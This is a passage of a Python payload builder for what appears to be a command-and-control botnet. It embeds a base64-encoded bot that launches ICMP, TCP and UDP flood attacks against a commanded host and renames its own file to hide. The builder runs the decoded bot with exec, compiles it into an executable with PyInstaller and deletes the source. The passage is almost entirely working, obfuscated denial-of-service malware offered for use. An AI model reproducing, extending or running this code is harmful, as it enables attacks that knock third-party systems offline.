2Mud3JpdGUoJ1xuJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmRlc2Mud3JpdGUoZ2VuZXJhdGVfcmFuZG9tX2NvZGUoKSkNCg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHN0cmluZw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZV9zbGVlcCA9IGludChzdHJpbmcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0X3BhdGggPSBvcy5wYXRoLmFic3BhdGgoc3lzLmFyZ3ZbMF0pDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0X3BhdGggPSBvcy5wYXRoLmFic3BhdGgoc3lzLmV4ZWN1dGFibGUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9kaXJlY3RvcnkgPSBvcy5wYXRoLmRpcm5hbWUoc2NyaXB0X3BhdGgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NyaXB0X2ZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShzY3JpcHRfcGF0aCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUgPSBzY3JpcHRfZGlyZWN0b3J5K3NlcCtzY3JpcHRfZmlsZW5hbWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHRkciA9IHN0cihzY3JpcHRfZGlyZWN0b3J5KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNjcmlwdG5tID0gc3RyKHNjcmlwdF9maWxlbmFtZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JpcHRkZiA9IHN0cihzY3JpcHRfZGlyZWN0b3J5X2ZpbGVuYW1lKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9leHRlbnNpb25zID0gWycudHh0JywgJy5qcGcnLCAnLnBuZycsICcuZG9jeCcsICcucGRmJ10NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhbmRvbV9maWxlbmFtZSA9IHN0cih1dWlkLnV1aWQ0KCkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFuZG9tX2V4dGVuc2lvbiA9IHJhbmRvbS5jaG9pY2UoZmlsZV9leHRlbnNpb25zKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5ld2ZpbGUgPSByYW5kb21fZmlsZW5hbWUrcmFuZG9tX2V4dGVuc2lvbg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVuYW1lKHNjcmlwdGRmLG5ld2ZpbGUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCh0aW1lX3NsZWVwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbmFtZShuZXdmaWxlLHNjcmlwdG5tKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2xlZXAgPSBGYWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAiaWNtcC1kZG9zIiBpbiBmaW5kOg0KDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmMgPSByZS5maW5kYWxsKHInXFsuKj9cXScsIGZpbmQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gYnJjDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyKHN0cmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiXSIsIiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIlsiLCIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCInIiwiIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNrID0gc3RyaW5nDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNob3N0ID0gcmUuZmluZGFsbChyJ1woLio/XCknLCBmaW5kKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IGJyY2hvc3QNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHIoc3RyaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCIpIiwiIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiKCIsIiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIiciLCIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCJdIiwiIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiWyIsIiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJja2hvc3QgPSBzdHJpbmcNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJIT1NUOiIsYnJja2hvc3QpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkRVUkFUSU9OOiIsYnJjaykNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVvdXQgPSB0aW1lLnRpbWUoKSArIGludChicmNrKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZHMgPSBpbnQoMzApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmIG1haW4oKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGltZS50aW1lKCkgPiB0aW1lb3V0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmIHBpbmdfaXAoY3VycmVudF9pcF9hZGRyZXNzKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgicGluZyAte30gMSB7fSIuZm9ybWF0KCduJyBpZiBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKSA9PSAid2luZG93cyIgZWxzZSAnYycsIGN1cnJlbnRfaXBfYWRkcmVzcyApLCBzaGVsbD1UcnVlLCB1bml2ZXJzYWxfbmV3bGluZXM9VHJ1ZSkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICd1bnJlYWNoYWJsZScgaW4gb3V0cHV0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBFOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1cnJlbnRfaXBfYWRkcmVzcyA9IFticmNraG9zdF0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBlYWNoIGluIGN1cnJlbnRfaXBfYWRkcmVzczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwaW5nX2lwKGVhY2gpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcHJpbnQoIklDTVAgaXMgYXZhaWxhYmxlIGFuZCB1cCIpICN1bmNvbW1lbnQgdG8gdmlldyBwYWNrZXRzIChkZXYgdGVzdGluZyBvbmx5KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI3ByaW50KCJJQ01QIGlzIG5vdCBhdmFpbGFibGUgb3IgZG93biAiKSAjdW5jb21tZW50IHRvIHZpZXcgcGFja2V0cyAoZGV2IHRlc3Rpbmcgb25seSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBFOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KEUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UodGhyZWFkcyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1tYWluKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByLnN0YXJ0KCkNCg0KDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJ0Y3AtZGRvcyIgaW4gZmluZDoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyYyA9IHJlLmZpbmRhbGwocidcWy4qP1xdJywgZmluZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBicmMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHIoc3RyaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCJdIiwgIiIpLnJlcGxhY2UoIlsiLCAiIikucmVwbGFjZSgiJyIsICIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY2sgPSBzdHJpbmcNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY2hvc3QgPSByZS5maW5kYWxsKHInXCguKj9cKScsIGZpbmQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gYnJjaG9zdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cihzdHJpbmcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIikiLCAiIikucmVwbGFjZSgiKCIsICIiKS5yZXBsYWNlKCInIiwgIiIpLnJlcGxhY2UoIl0iLCAiIikucmVwbGFjZSgiWyIsICIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY2tob3N0ID0gc3RyaW5nDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiSE9TVDoiLGJyY2tob3N0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJEVVJBVElPTjoiLGJyY2spDQoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVvdXQgPSB0aW1lLnRpbWUoKSArIGludChicmNrKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmIG1haW4oKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRpbWUudGltZSgpID4gdGltZW91dDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgidGltZW91dCByZWFjaGVkIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHA6Ly8iK2JyY2tob3N0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcHJpbnQocikgI3VuY29tbWVudCB0byB2aWV3IHBhY2tldHMgKGRldiB0ZXN0aW5nIG9ubHkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBFOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcHJpbnQoRSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UoNTApOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9bWFpbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdC5zdGFydCgpDQoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgInVkcC1kZG9zIiBpbiBmaW5kOg0KDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmMgPSByZS5maW5kYWxsKHInXFsuKj9cXScsIGZpbmQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gYnJjDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyKHN0cmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiXSIsICIiKS5yZXBsYWNlKCJbIiwgIiIpLnJlcGxhY2UoIiciLCAiIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNrID0gc3RyaW5nDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNob3N0ID0gcmUuZmluZGFsbChyJ1woLio/XCknLCBmaW5kKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IGJyY2hvc3QNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHIoc3RyaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCIpIiwgIiIpLnJlcGxhY2UoIigiLCAiIikucmVwbGFjZSgiJyIsICIiKS5yZXBsYWNlKCJdIiwgIiIpLnJlcGxhY2UoIlsiLCAiIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNraG9zdCA9IHN0cmluZw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjcG9ydCA9IHJlLmZpbmRhbGwocidcey4qP1x9JywgZmluZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBicmNwb3J0DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyKHN0cmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiKSIsICIiKS5yZXBsYWNlKCIoIiwgIiIpLnJlcGxhY2UoIiciLCAiIikucmVwbGFjZSgiXSIsICIiKS5yZXBsYWNlKCJbIiwgIiIpLnJlcGxhY2UoIn0iLCAiIikucmVwbGFjZSgieyIsICIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY3BvcnQgPSBzdHJpbmcNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJIT1NUOiIsYnJja2hvc3QpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkRVUkFUSU9OOiIsYnJjaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiUE9SVDoiLGJyY3BvcnQpDQoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlZiBtYWluKCk6DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlcyA9IHJhbmRvbS5fdXJhbmRvbSgxMDI0KQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVvdXQgPSB0aW1lLnRpbWUoKSArIGludChicmNrKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW50ID0gMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzb2NrID0gc29ja2V0DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGltZS50aW1lKCkgPiB0aW1lb3V0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgidGltZW91dCByZWFjaGVkIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc29jay5zZW5kdG8oYnl0ZXMsIChicmNraG9zdCwgaW50KGJyY3BvcnQpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5dGVzID0gcmFuZG9tLl91cmFuZG9tKDEwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VudCA9IHNlbnQgKyAxDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcHJpbnQoInNlbnQiLHNlbnQsInBhY2tldHMgdG8iLGJyY2tob3N0LCJ0aHJvdWdoIixicmNwb3J0KSAjdW5jb21tZW50IHRvIHZpZXcgcGFja2V0cyAoZGV2IHRlc3Rpbmcgb25seSkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN5cy5leGl0KCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1tYWluKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIuc3RhcnQoKQ0KDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIEU6DQogICAgICAgICAgICBwcmludChFKQ0KICAgICAgICAgICAgcGFzcw0KDQpmMSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNkKQ0KZjIgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1tbikNCg0KZjEuc3RhcnQoKQ0KZjIuc3RhcnQoKQ0K"

decryption_key = "{encryption_key}"
sendtourl = "{full_url}/"

while len(code) % 4 != 0:
    code += '='

decoded_bytes = base64.b64decode(code)
decoded_text = decoded_bytes.decode('utf-8')

print("Using key: ",decryption_key)
print("Using server:",sendtourl)
exec(decoded_text)

'''
        import platform
        
        with open(payload_name, 'w') as file:
            file.write(content)
            file.close


        print("[+]"+payload_name+" Generated")

        print("[%]Compliling "+payload_name)

        op_system = platform.system()

        if op_system == "Linux" or os == "Linux2":
            os.system("pyinstaller --onefile "+payload_name)
            
        if op_system == "Windows":
            os.system("py -m PyInstaller --onefile "+payload_name)
            
        print("[%]Removing "+payload_name+" Source")

        os.remove(payload_name)

        print("[+]Compiled\n")

        
        
                    


                        
                            
                        















                


